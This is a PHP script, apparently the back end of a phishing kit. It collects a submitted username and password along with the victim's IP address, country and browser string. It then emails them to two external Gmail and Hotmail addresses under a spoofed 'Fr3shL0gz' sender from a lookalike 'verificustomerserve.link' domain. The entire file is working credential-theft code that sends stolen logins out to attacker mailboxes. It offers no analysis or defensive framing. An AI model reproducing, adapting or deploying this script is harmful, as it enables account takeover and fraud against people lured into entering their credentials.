<?php
session_start();
// include("email.php"); 

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

$username = $_REQUEST["username"];
$password = $_REQUEST["password"];
$ip = $_SERVER['REMOTE_ADDR'];
$country = visitor_country();
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d, Y g:i a");
$sender = 'Fr3shL0gz';
$headers = "From: Fr3shL0gz <info@verificustomerserve.link>\n";
//$headers = "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
// $headers = "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$subj = "New Submission";

$data=" 
----------
User : $username
Pass : $password
-----------------------------------
IPAdres : $ip
Country :  $country
AddDate : $adddate
UserAgent : $browser
-----------------------------------
";

$recipient1 = "Toolsboxcracking30@gmail.com";
$rec2 = "bclif43@hotmail.com";

mail($recipient1 , $subj , $data , $headers);
mail($rec2 , $subj , $data , $headers);

?>